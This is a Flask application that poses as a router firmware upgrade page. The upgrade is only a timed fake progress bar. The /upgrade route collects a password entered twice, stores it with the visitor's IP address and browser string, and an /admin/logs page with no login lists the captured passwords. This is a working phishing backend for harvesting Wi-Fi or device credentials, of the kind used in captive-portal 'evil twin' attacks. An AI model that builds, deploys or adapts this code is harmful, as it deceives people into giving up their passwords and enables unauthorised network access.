from flask import Flask, render_template, request, jsonify, redirect, url_for
import time
import threading
import os
from dotenv import load_dotenv
from database import db_manager

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'fallback_secret_key_change_in_production')

# Global variable to track upgrade status
upgrade_status = {
    'in_progress': False,
    'progress': 0,
    'message': '',
    'completed': False,
    'log_id': None
}

def simulate_upgrade():
    """Simulate firmware upgrade process"""
    global upgrade_status
    
    upgrade_status['in_progress'] = True
    upgrade_status['progress'] = 0
    upgrade_status['message'] = 'Initializing firmware upgrade...'
    
    # Update database with initial progress
    if upgrade_status.get('log_id'):
        db_manager.update_upgrade_progress(
            upgrade_status['log_id'], 
            0, 
            'Initializing firmware upgrade...'
        )
    
    # Simulate upgrade steps
    steps = [
        (10, 'Validating firmware image...'),
        (25, 'Backing up current configuration...'),
        (40, 'Erasing flash memory...'),
        (55, 'Writing new firmware...'),
        (70, 'Verifying firmware integrity...'),
        (85, 'Updating configuration...'),
        (95, 'Restarting system services...'),
        (100, 'Firmware upgrade completed successfully!')
    ]
    
    for progress, message in steps:
        upgrade_status['progress'] = progress
        upgrade_status['message'] = message
        
        # Update database with progress
        if upgrade_status.get('log_id'):
            status = 'completed' if progress == 100 else 'in_progress'
            db_manager.update_upgrade_progress(
                upgrade_status['log_id'], 
                progress, 
                message,
                status
            )
        
        time.sleep(2)  # Simulate processing time
    
    # Mark upgrade as completed in database
    if upgrade_status.get('log_id'):
        db_manager.complete_upgrade_log(upgrade_status['log_id'], success=True)
    
    upgrade_status['in_progress'] = False
    upgrade_status['completed'] = True

@app.route('/')
def index():
    """Main firmware upgrade page"""
    return render_template('index.html')

@app.route('/upgrade', methods=['POST'])
def upgrade():
    """Handle firmware upgrade request"""
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    
    # Get client information
    ip_address = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    # Basic validation
    if not password or not confirm_password:
        return jsonify({
            'success': False,
            'message': 'Please enter both password fields'
        })
    
    if password != confirm_password:
        return jsonify({
            'success': False,
            'message': 'Passwords do not match'
        })
    
    if len(password) < 8:
        return jsonify({
            'success': False,
            'message': 'Password must be at least 8 characters long'
        })
    
    # Save password to MySQL database
    try:
        session_info = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'upgrade_initiated': True
        }
        
        password_id = db_manager.save_password(
            password, 
            ip_address, 
            user_agent, 
            str(session_info)
        )
        
        if not password_id:
            return jsonify({
                'success': False,
                'message': 'Failed to save password. Please try again.'
            })
        
        # Log upgrade start
        log_id = db_manager.log_upgrade_start(
            ip_address,
            user_agent,
            firmware_from="v2.4.1",
            firmware_to="v2.5.0"
        )
        
        print(f"Password saved with ID: {password_id}, Upgrade log ID: {log_id}")
        
    except Exception as e:
        print(f"Database error: {e}")
        return jsonify({
            'success': False,
            'message': 'Database connection error. Please try again later.'
        })
    
    # Reset upgrade status
    global upgrade_status
    upgrade_status = {
        'in_progress': False,
        'progress': 0,
        'message': '',
        'completed': False,
        'log_id': log_id
    }
    
    # Start upgrade process in background
    upgrade_thread = threading.Thread(target=simulate_upgrade)
    upgrade_thread.start()
    
    return jsonify({
        'success': True,
        'message': 'Firmware upgrade started',
        'password_saved': True,
        'log_id': log_id
    })

@app.route('/progress')
def progress():
    """Get current upgrade progress"""
    return jsonify(upgrade_status)

@app.route('/upgrading')
def upgrading():
    """Upgrade progress page"""
    return render_template('upgrading.html')

@app.route('/success')
def success():
    """Upgrade success page"""
    return render_template('success.html')

@app.route('/admin/logs')
def admin_logs():
    """Admin page to view password and upgrade logs"""
    try:
        recent_passwords = db_manager.get_recent_passwords(20)
        upgrade_history = db_manager.get_upgrade_history(20)
        
        return render_template('admin_logs.html', 
                             passwords=recent_passwords, 
                             upgrades=upgrade_history)
    except Exception as e:
        print(f"Error fetching logs: {e}")
        return render_template('admin_logs.html', 
                             passwords=[], 
                             upgrades=[],
                             error="Failed to fetch logs from database")

@app.before_request
def initialize_database():
    """Initialize database connection and create tables"""
    if not hasattr(initialize_database, 'initialized'):
        try:
            print("Initializing database...")
            db_manager.create_database_and_tables()
            db_manager.connect()
            print("Database initialized successfully")
            initialize_database.initialized = True
        except Exception as e:
            print(f"Database initialization error: {e}")
            initialize_database.initialized = True  # Prevent repeated attempts

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
